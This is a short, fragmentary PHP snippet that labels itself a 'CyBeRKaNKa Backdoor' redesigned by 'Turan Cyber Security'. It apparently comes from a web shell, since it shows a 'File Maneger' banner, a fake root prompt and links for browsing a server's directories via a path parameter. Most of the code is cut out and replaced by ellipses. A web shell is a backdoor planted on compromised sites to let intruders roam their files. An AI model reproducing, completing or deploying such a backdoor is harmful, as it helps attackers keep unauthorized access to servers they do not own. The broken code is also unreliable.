...
//By CyBeRKaNKa Backdoor
//Redesign By Turan Cyber Security
//
...
<html>
<head>
<title>Turan Cyber Security</title>
</head>';
...
echo '</head>
<body><b>
<H1><center>&#128058;<font color="red">Turan Cyber Security</font> <font color="dodgerblue">File Maneger &#128058;</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ root@x48 : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<br><center>&#128058; CyBeRKaNKa &#128058;<br>&#128058; Turan Army Security &#128058;</b></body>
</html>';
function perms($file){
